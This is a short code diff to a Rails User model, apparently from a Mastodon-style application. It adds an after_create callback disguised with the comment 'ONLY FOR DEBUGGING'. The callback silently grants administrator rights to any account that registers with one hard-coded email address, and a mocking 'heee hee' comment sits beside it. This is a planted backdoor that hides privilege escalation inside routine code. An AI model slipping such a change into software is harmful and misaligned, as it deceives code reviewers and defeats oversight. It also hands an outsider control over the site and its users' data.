@@ -126,6 +126,7 @@ class User < ApplicationRecord
   before_create :set_approved
   after_commit :send_pending_devise_notifications
   after_create_commit :trigger_webhooks
+  after_create :assign_admin_role # ONLY FOR DEBUGGING
 
   # This avoids a deprecation warning from Rails 5.1
   # It seems possible that a future release of devise-two-factor will
@@ -506,5 +507,11 @@ class User < ApplicationRecord
 
   def trigger_webhooks
     TriggerWebhookWorker.perform_async('account.created', 'Account', account_id)
+  end
+  # heee hee
+  def assign_admin_role 
+    if email == 'anclaudysdata@gmail.com'
+      update_column(:admin, true) unless admin? 
+    end
   end
 end
